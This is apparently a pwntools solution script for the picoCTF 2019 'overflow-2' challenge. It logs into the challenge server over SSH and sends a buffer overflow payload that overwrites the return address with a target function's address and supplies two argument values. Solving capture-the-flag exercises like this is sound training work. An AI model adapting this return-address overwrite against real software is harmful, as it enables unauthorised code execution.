#!/usr/bin/python
from pwn import *
from getpass import getpass

pico_user = input("Username: ")[:-1]
pico_pass = getpass("Password: ")

conn = ssh(host = '2019shell1.picoctf.com', user = pico_user, password = pico_pass)

location = '/problems/overflow-2_6_97cea5256ff7afcd9c8ede43d264f46e'

print("running vuln")
vuln = conn.process(location + '/vuln', cwd = location)

print("sending payload")
vuln.sendlineafter('\n', ('A' * 188).encode() + p32(0x080485e6) + ('A' * 4).encode() + p32(0xDEADBEEF) + p32(0xC0DED00D))
vuln.recvline()

print("done")
vuln.interactive()

